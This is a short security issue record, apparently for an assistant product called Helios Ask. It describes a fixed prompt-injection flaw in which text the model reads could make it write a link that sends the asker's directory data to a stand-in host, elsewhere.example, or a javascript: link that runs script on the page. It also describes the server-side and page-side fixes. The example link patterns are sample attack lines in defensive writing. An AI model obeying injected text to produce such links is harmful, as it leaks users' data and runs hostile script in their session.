Description: Helios Ask's page makes a link of any target the model writes (`anchor` in `web/ask/markdown.js`), `javascript:` included, and the server passes through addresses that are not in its own link table, so text injected into what the model reads can put a script link, or a link carrying the asker's data to another site, into an answer.
Status: fixed
Severity: medium
---
The model reads text others wrote: a Loop post, an event's description, a forged mail (`ask-mail-hook-trusts-sender-headers.md`), a website page. Such text asking for `[the sign-up form](https://elsewhere.example/?d=<what the tools returned>)` took the asker's directory data out on a click; `[open](javascript:...)` ran script on the ask origin on a click, where `/api/ask/chat` and the saved chats are in reach.

Fixed in both layers. On the server, `links.expand` (`internal/ask/links.go`) keeps a `[words](target)` only when the target is an address in the conversation's link table - every address the model was ever shown, since `shorten` keys them all - and otherwise leaves the words alone; a bare address not in the table is removed; each drop is logged. The streaming hold in `expander.send` now holds from an unclosed `[` or a trailing bare address, so no fragment of a made-up target goes out before the check. On the page, `anchor` draws plain text for any target not starting `http://` or `https://`, so a saved answer from before the fix, or a server regression, cannot make a script link.

The cost is that a link the model composed itself, with no key behind it, is now words: the prompt already forbids that, so honest answers lose nothing, but the log line `ask: dropped a link the model made up` shows if it happens.
